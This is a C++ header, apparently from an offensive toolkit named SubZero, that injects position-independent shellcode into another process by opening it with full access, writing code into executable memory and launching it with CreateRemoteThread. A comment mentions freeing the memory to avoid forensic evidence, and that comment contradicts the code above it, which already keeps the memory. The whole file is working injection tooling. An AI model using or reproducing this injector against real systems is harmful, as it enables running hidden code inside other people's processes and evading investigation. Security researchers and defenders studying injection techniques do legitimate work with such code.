#pragma once
#include "pch.h"
#include "../SubZeroUtils/AutoHandle.h"
#include "../SubZeroUtils/Win32ErrorCodeException.h"
#include "../SubZeroUtils/VirtualAllocExGuard.h"
#include "../SubZeroUtils/DebugPrint.h"
#include "../SubZeroUtils/StringUtils.h"

class PISInjection
{
	static void writeToTargetProcess(HANDLE targetProcess, LPVOID remoteAddress, LPVOID data, SIZE_T dataSize);
public:
	
	template <typename PisParameters>
	static void InjectPis(const std::uint32_t targetPid, PisParameters* pisParameters, const PVOID pisStart, const PVOID pisEnd)
	{

		const int pisBytesSize = reinterpret_cast<LPBYTE>(pisEnd) - reinterpret_cast<LPBYTE>(pisStart);
		if (0 >= pisBytesSize)
			throw std::runtime_error("[-] Invalid PIS size");		
		
		const AutoHandle targetProcess(OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid));
		if (nullptr == targetProcess.get())		
			throw Win32ErrorCodeException("[-] Could not open handle to target process");

		DEBUG_PRINT("[+] Open handle to target process");

		VirtualAllocExGuard remoteParamsMemoryGuard(targetProcess.get(), sizeof(PisParameters), PAGE_EXECUTE_READWRITE);
		DEBUG_PRINT("[+] Allocate memory for PIS parameters in target process");

		writeToTargetProcess(targetProcess.get(), remoteParamsMemoryGuard.get(), pisParameters, sizeof(PisParameters));
		DEBUG_PRINT("[+] Write PIS parameters to target process at address: " + StringUtils::hexValue(reinterpret_cast<std::uint64_t>(remoteParamsMemoryGuard.get())));

		VirtualAllocExGuard remotePisMemoryGuard(targetProcess.get(), pisBytesSize, PAGE_EXECUTE_READWRITE);
		DEBUG_PRINT("[+] Allocate memory for PIS in target process");

		writeToTargetProcess(targetProcess.get(), remotePisMemoryGuard.get(), pisStart, pisBytesSize);
		DEBUG_PRINT("[+] Write PIS to target process at address: " + StringUtils::hexValue(reinterpret_cast<std::uint64_t>(remotePisMemoryGuard.get())));

		DWORD threadId;
		const AutoHandle targetThread(CreateRemoteThread(targetProcess.get(), nullptr, 0,
			static_cast<LPTHREAD_START_ROUTINE>(remotePisMemoryGuard.get()), remoteParamsMemoryGuard.get(), 0, &threadId));
		if (nullptr == targetThread.get())
			throw Win32ErrorCodeException("[-] Could not create remote thread in target process");

		DEBUG_PRINT("[+] Create remote thread in target process TID=" + std::to_string(threadId));

		// The injection succeeded, so we don't want to destroy the memory:
		remoteParamsMemoryGuard.release();
		remotePisMemoryGuard.release();

		/*
		 * VirtualAllocExGuard get called automatically in order to release the
		 * shellcode's memory and avoid forensics evidence.
		 * If you want to keep the remote allocation after the injection add:
			 remoteParamsMemoryGuard.release();
			 remotePisMemoryGuard.release();
		*/
	}
};